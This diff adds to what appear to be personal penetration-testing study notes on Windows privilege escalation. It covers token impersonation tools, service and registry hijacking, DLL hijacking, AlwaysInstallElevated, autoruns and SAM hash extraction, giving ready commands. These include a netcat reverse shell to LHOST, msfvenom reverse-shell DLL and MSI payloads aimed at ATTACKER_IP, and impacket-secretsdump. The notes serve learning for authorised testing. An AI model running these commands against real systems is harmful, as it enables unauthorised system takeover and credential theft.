@@ -154,6 +154,11 @@ wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v ""
 ```
 schtasks /query /fo LIST /v
 ```
+- check the permissions for writable which means exploitable
+```
+icacls <PATH>
+```
+- Wait till the scheduled task is executed then you'll get a shell
 ### 16.3.2 Using Exploits
 - Non-privileged users with assigned privileges such as SeImpersonateProvilege can potentially abuse these privileges to perform privilege escalation attacks 
 - This offers the possibility to leverage a token with another security context meaning a user with this privilege can perform operations in the context of another user account under the right circumstances
@@ -164,6 +169,169 @@ schtasks /query /fo LIST /v
 	- SERVIC
 - If the usser has SeImpersonatePrivilege enabled you can use printspoofer by itm4n
 	- This implements a variation of the printer bug to coerce NT AUTHORITY|SYSTEM into connecting into a controlled named pipe and gives you an interactive shell as NT AUTHORITY|SYSTEM
-## Exercises To-Do
+## Token Impersonation
+- command to check 
+```
+whoami /priv look for IMPERSONATION TRUE
+```
+### PrintSpoofer
+```
+printspoofer.exe -i -c powershell.exe
+```
+```
+printspoofer -c "nc.exe <LHOST> <LPORT> -e cmd"
+```
+### RoguePotato
+```
+roguepotato.exe -r <ATTACKERIP> -d "shell.exe" -l 9999
+```
+### GodPotato
+```
+godpotato.exe -cmd "cmd /c whoami"
+```
+```
+godpotato.exe -cmd "shell.exe"
+```
+### JuicyPotatoNG
+```
+juicypotatong.exe -t * -p "shell.exe" -a
+```
+### SharpEfsPotato
+- Writes whoami command to w.log file
+```
+Sharpefspotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-content C:\temp\w.log"
+```
+## Service Exploitation
+### Binary Hijacking
+- Identify service from winpeas
+```
+icacls <PATH>
+```
+- F means full permissions and we need to check that we have full access to he folder
+- find the binarypath variable with 
+```
+sc qc <SERVICENAME>
+```
+- change the path to the reverse shell location with
+```
+sc config <SERVICE> <OPTION>="<VALUE>"
+```
+```
+sc start <SERVICENAME>
+```
+### Unquoted Service Path
+- display services which are missing quotes that can also be found with winpeas
+```
+wmic service get name.pathname | findstr /i /v "C:\windows\\" | findstr /i /v """
+```
+- Check for a writable path with 
+```
+icacls <PATH>
+```
+- Insert the payload in a writable location then run
+```
+sc start <SERVICENAME>
+```
+### Insecure Service Executables
+- In winPEAS output look for a service with the following output
+```
+File Permissions: Everyone [AllAccess]
+```
+- Replace the executable in the service folder and start the service
+```
+sc start <SERVICE>
+```
+### Weak Registry permissions
+- Look for the following in winPEAS services info output to see that you have full access
+```
+HKLM\System\CurrentControlSet\Services\<SERVICE> (Interactive [FullControl])
+```
+- check for KEY_ALL_ACCESS
+```
+accesschk /acceptula -uvwqk <PATH_OF_REGISTRY>
+```
+- Service information from regedit to identify the variable which holds the executable
+```
+reg query <REGISTRY_PATH>
+```
+- Imagepath is the variable here
+```
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+```
+```
+net start <SERVICE>
+```
+### DLL Hijacking
+- find missing DLLs using process monitor then identify a specific service which looks suspicious and add a filter
+- Then check whether you have write permissions in the directory associated with the service 
+- Create the reverse shell
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LISTENING_PORT> -f dll > filename.dll
+```
+- copy this to the victim machine and move it into the service assocoated directory (make sure the dll name is similar to missing name)
+- Start a listener and restart the service and you should get a shell
+### Autoruns
+- For checking it will display some information with file-location
+```
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+```
+```
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+```
+- check that the location is writable (should return FILE_ALL_ACCESS)
+```
+accesschk.exe \accepteula -wvu "<path>"
+```
+- Replace the executable with the reverse shell and we need to wait till admin logins then we'll have the shell
+### AlwaysInstallElevated
+- Checking with the following should return 1 or 0x1
+```
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+```
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+- create a reverse shell in MSI format
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> --platform windows -f msi > reverse.msi
+```
+- Execute the installer on the host to get the shell 
+```
+msiexec /quiet /qn /i reverse.msi
+```
+### Startup Apps
+- Startup applications can be found at 
+```
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+```
+- Check for writable permissions and move the file over
+- The only catch is that the system needs to be restarted
+### Insecure GUI Apps
+- Check the applications that are running from task manager and obtain the list of applications that are running as privleged user
+- Open the privileged user application using the open feature and enter the following
+```
+file:://c:/windows/system32/cmd.exe
+```
+### SAM and SYSTEM
+- Check the following folders
+```
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
 
-- [ ] 2.1.1 (page 20)
+C:\windows.old
+```
+- First got to C:\ then 
+```
+dir /s SAM
+```
+```
+dir /s SYSTEM
+```
+- Obtaining hashes from SYSTEM and SAM (always mention local in the command)
+```
+impacket-secretsdump -system SYSTEM -sam SAM local
+```
